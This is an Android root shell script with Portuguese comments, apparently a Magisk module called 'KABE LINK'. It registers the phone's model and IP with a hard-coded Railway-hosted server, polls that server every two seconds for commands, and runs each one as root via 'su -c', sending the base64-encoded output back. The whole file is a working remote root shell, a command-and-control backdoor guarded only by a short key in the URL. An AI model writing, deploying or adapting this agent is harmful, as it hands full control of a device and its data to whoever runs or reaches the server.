#!/system/bin/sh
# ═══════════════════════════════════════════════════════
#   KABE LINK — Conexao reversa ao site (de qualquer lugar)
#   O celular conecta PRA FORA no site KABE PRIVATE.
#   Funciona em qualquer rede (WiFi, 4G/5G).
# ═══════════════════════════════════════════════════════

MODDIR=${0%/*}
DATA_DIR="/data/adb/kabe"
KEY_FILE="$DATA_DIR/key"
CONFIG_FILE="$DATA_DIR/config"
LOG_FILE="$DATA_DIR/link.log"
PID_FILE="$DATA_DIR/link.pid"

# Server padrao: site no Railway (pode ser alterado no config)
DEFAULT_SERVER="https://kabe-private-production.up.railway.app"

mkdir -p "$DATA_DIR" 2>/dev/null

log() {
    echo "$(date '+%H:%M:%S') $1" >> "$LOG_FILE"
    echo "$1"
}

# curl com fallback wget
http_get() {
    curl -s --connect-timeout 5 --max-time 10 "$1" 2>/dev/null || \
    wget -q -O - --timeout=10 "$1" 2>/dev/null
}

# POST JSON (o site aceita JSON — form-urlencoded da erro 400)
http_post() {
    local url="$1"
    local json="$2"
    curl -s --connect-timeout 5 --max-time 10 -X POST -H "Content-Type: application/json" -d "$json" "$url" 2>/dev/null || \
    wget -q -O - --timeout=10 --header="Content-Type: application/json" --post-data="$json" "$url" 2>/dev/null
}

# JSON escape simples
json_esc() {
    printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'
}

read_config() {
    if [ -f "$CONFIG_FILE" ]; then
        grep "^$1=" "$CONFIG_FILE" 2>/dev/null | cut -d= -f2-
    fi
}

save_config() {
    local k="$1"
    local v="$2"
    if [ -f "$CONFIG_FILE" ] && grep -q "^$k=" "$CONFIG_FILE" 2>/dev/null; then
        sed -i "s|^$k=.*|$k=$v|" "$CONFIG_FILE" 2>/dev/null
    else
        echo "$k=$v" >> "$CONFIG_FILE"
    fi
}

# ===== GERAR KEY SE NAO EXISTIR =====
if [ ! -f "$KEY_FILE" ]; then
    RANDOM_PART=$(cat /proc/sys/kernel/random/uuid 2>/dev/null | tr -d '-' | head -c 8 | tr 'a-z' 'A-Z')
    [ -z "$RANDOM_PART" ] && RANDOM_PART=$(date +%s | md5sum 2>/dev/null | head -c 8 | tr 'a-z' 'A-Z')
    KEY="KABE-${RANDOM_PART}"
    echo "$KEY" > "$KEY_FILE"
    chmod 600 "$KEY_FILE"
    log "Key gerada: $KEY"
fi

KEY=$(cat "$KEY_FILE" 2>/dev/null | tr -d '\n\r' | xargs)
if [ -z "$KEY" ]; then
    log "ERRO: Key vazia"
    exit 1
fi

# Server do config (ou padrao)
SERVER_URL=$(read_config "server")
if [ -z "$SERVER_URL" ]; then
    SERVER_URL="$DEFAULT_SERVER"
    save_config "server" "$SERVER_URL"
fi

# Device ID e IP
DEVICE_ID=$(getprop ro.product.model 2>/dev/null)
[ -z "$DEVICE_ID" ] && DEVICE_ID="android-$(cat /proc/sys/kernel/random/uuid 2>/dev/null | head -c 8)"

PHONE_IP=""
for iface in wlan0 eth0 wlan1 rmnet0; do
    PHONE_IP=$(ip addr show "$iface" 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    [ -n "$PHONE_IP" ] && break
done
[ -z "$PHONE_IP" ] && PHONE_IP="unknown"

log "════════════════════════════════════════"
log "KABE LINK iniciado"
log "Key: $KEY"
log "Server: $SERVER_URL"
log "Device: $DEVICE_ID"
log "IP: $PHONE_IP"
log "════════════════════════════════════════"

# ===== MATAR AGENTE ANTIGO =====
if [ -f "$PID_FILE" ]; then
    OLD_PID=$(cat "$PID_FILE" 2>/dev/null)
    if [ -n "$OLD_PID" ] && kill -0 "$OLD_PID" 2>/dev/null; then
        kill -9 "$OLD_PID" 2>/dev/null
        sleep 1
    fi
fi

echo $$ > "$PID_FILE"

# ===== LOOP PRINCIPAL =====
# Retries de conexao (caso esteja sem internet no boot)
RETRY=0
log "Iniciando loop de polling..."

while true; do
    # Sinal de parada
    if [ -f "$DATA_DIR/stop" ]; then
        rm -f "$DATA_DIR/stop"
        log "Sinal de parada recebido"
        break
    fi

    # Heartbeat + registro
    http_post "$SERVER_URL/api/agent/register" "{\"key\":\"$KEY\",\"id\":\"$(json_esc "$DEVICE_ID")\",\"ip\":\"$PHONE_IP\"}" > /dev/null 2>&1 &

    # Poll por comandos
    RESPONSE=$(http_get "$SERVER_URL/api/agent/poll?key=$KEY")

    if [ -n "$RESPONSE" ] && [ "$RESPONSE" != "null" ] && [ "$RESPONSE" != "" ]; then
        CMD_ID=$(echo "$RESPONSE" | grep -o '"id":[0-9]*' | head -1 | cut -d: -f2)
        CMD_TEXT=$(echo "$RESPONSE" | grep -o '"cmd":"[^"]*"' | head -1 | cut -d'"' -f4)

        if [ -n "$CMD_TEXT" ] && [ -n "$CMD_ID" ]; then
            log "Executando cmd #$CMD_ID: $CMD_TEXT"
            OUTPUT=$(su -c "$CMD_TEXT" 2>&1)
            EXIT_CODE=$?

            OUTPUT_B64=$(echo "$OUTPUT" | base64 -w 0 2>/dev/null || echo "$OUTPUT" | base64 2>/dev/null)
            http_post "$SERVER_URL/api/agent/output" "{\"key\":\"$KEY\",\"id\":$CMD_ID,\"exit\":$EXIT_CODE,\"data\":\"$OUTPUT_B64\"}" > /dev/null 2>&1 &
            log "Cmd #$CMD_ID concluido (exit=$EXIT_CODE)"
        fi
    fi

    sleep 2
done

rm -f "$PID_FILE"
log "KABE LINK parado"
